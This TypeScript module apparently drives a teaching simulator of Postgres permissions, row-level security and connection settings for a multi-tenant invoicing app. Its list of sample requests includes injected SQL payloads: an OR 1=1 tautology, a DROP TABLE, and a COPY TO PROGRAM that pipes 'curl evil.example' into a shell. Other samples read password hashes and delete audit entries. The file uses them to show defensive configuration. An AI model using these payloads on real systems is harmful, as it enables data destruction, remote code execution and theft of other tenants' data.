// Database security for a multi-tenant invoicing app, checked the way Postgres checks it:
// superusers bypass every permission check and row-level security; a table's owner can drop it
// and bypasses its RLS policies (unless FORCE ROW LEVEL SECURITY); other roles need a GRANT per
// table or column; RLS policies filter rows by the current tenant. Six requests, some of them
// injected through a vulnerable endpoint, run against these rules and 60 invoice rows. Error
// texts follow Postgres's messages.

export type Connect = "superuser" | "owner" | "app";
export type Setup = { connect: Connect; rls: boolean; columnGrants: boolean; appendOnlyAudit: boolean };

export type Invoice = { id: number; tenant: number; total: number };
export const INVOICES: Invoice[] = Array.from({ length: 60 }, (_, i) => ({ id: 1001 + i, tenant: 1 + (i % 6), total: 50 + ((i * 37) % 400) }));
export const TENANT = 4;

export type Action = {
  id: string;
  who: "app" | "reporting" | "support";
  label: string;
  sql: string;
  injected?: boolean;
};
export const ACTIONS: Action[] = [
  { id: "list", who: "app", label: "Tenant 4 lists its invoices", sql: `SELECT * FROM invoices WHERE tenant_id = ${TENANT}` },
  { id: "inject", who: "app", label: "Search box injection: OR 1=1", sql: `SELECT * FROM invoices WHERE tenant_id = ${TENANT} AND number LIKE '%' OR 1=1 --%'`, injected: true },
  { id: "drop", who: "app", label: "Injected: DROP TABLE", sql: "'; DROP TABLE invoices; --", injected: true },
  { id: "program", who: "app", label: "Injected: run a shell command", sql: "'; COPY (SELECT '') TO PROGRAM 'curl evil.example | sh'; --", injected: true },
  { id: "hashes", who: "reporting", label: "Reporting reads password hashes", sql: "SELECT email, password_hash FROM users" },
  { id: "audit", who: "support", label: "Support deletes audit entries", sql: "DELETE FROM audit_log WHERE actor = 'support'" },
];

export type Result = { allowed: boolean; rows?: number; tenants?: number; message: string };

export function check(a: Action, s: Setup): Result {
  const superuser = a.who === "app" && s.connect === "superuser";
  const owner = a.who === "app" && s.connect === "owner";
  switch (a.id) {
    case "list":
    case "inject": {
      // Superusers and the table owner bypass RLS (the owner unless FORCE ROW LEVEL SECURITY).
      const filtered = s.rls && !superuser && !owner;
      const match = a.id === "list" ? INVOICES.filter((r) => r.tenant === TENANT) : INVOICES; // OR 1=1 matches everything
      const rows = filtered ? match.filter((r) => r.tenant === TENANT) : match;
      const tenants = new Set(rows.map((r) => r.tenant)).size;
      return { allowed: true, rows: rows.length, tenants, message: filtered ? `RLS policy tenant_id = current_setting('app.tenant_id') kept ${rows.length} rows` : `${rows.length} rows from ${tenants} tenant${tenants === 1 ? "" : "s"}${s.rls && (superuser || owner) ? ` (RLS is on, but ${superuser ? "superusers" : "the table owner"} bypass it)` : ""}` };
    }
    case "drop":
      return superuser || owner ? { allowed: true, message: "DROP TABLE: the invoices table is gone" } : { allowed: false, message: "ERROR: must be owner of table invoices" };
    case "program":
      return superuser ? { allowed: true, message: "COPY 1: the database server just ran a downloaded script" } : { allowed: false, message: "ERROR: permission denied to COPY to or from an external program" };
    case "hashes":
      return s.columnGrants ? { allowed: false, message: "ERROR: permission denied for table users (reporting may read only id, email, created_at)" } : { allowed: true, rows: 120_000, message: "120,000 password hashes, ready for offline cracking" };
    case "audit":
      return s.appendOnlyAudit ? { allowed: false, message: "ERROR: permission denied for table audit_log (support may only INSERT)" } : { allowed: true, rows: 37, message: "DELETE 37: the evidence is gone" };
  }
  return { allowed: false, message: "" };
}

export const GRANTS = (s: Setup) => [
  { role: s.connect === "superuser" ? "postgres (superuser)" : s.connect === "owner" ? "app_owner (owns the tables)" : "app_rw", what: s.connect === "app" ? "SELECT, INSERT, UPDATE on invoices, users; INSERT on audit_log" : "everything, including DROP" },
  { role: "reporting", what: s.columnGrants ? "SELECT (id, email, created_at) ON users; SELECT on invoices" : "SELECT on all tables" },
  { role: "support", what: s.appendOnlyAudit ? "INSERT on audit_log" : "SELECT, INSERT, UPDATE, DELETE on audit_log" },
  { role: "migrator", what: "owns the tables; used only by deploys, never by the app" },
];

// ---- the connection --------------------------------------------------------------------------

export type Ssl = "disable" | "require" | "verify-full";
export type Creds = "static" | "iam";
export function connection(ssl: Ssl, creds: Creds) {
  const wire = ssl === "disable" ? "every query and result crosses the network in plain text" : ssl === "require" ? "encrypted, but the server's certificate isn't checked, so a machine in the middle can pose as the database" : "encrypted, and the certificate is checked against the expected host name";
  const leak = creds === "static" ? { lifetime: "until someone rotates it (often never)", note: "a password in config, reused by every instance" } : { lifetime: "15 minutes", note: "a short-lived token minted from the instance's cloud identity (IAM)" };
  return { safeWire: ssl === "verify-full", wire, ...leak };
}
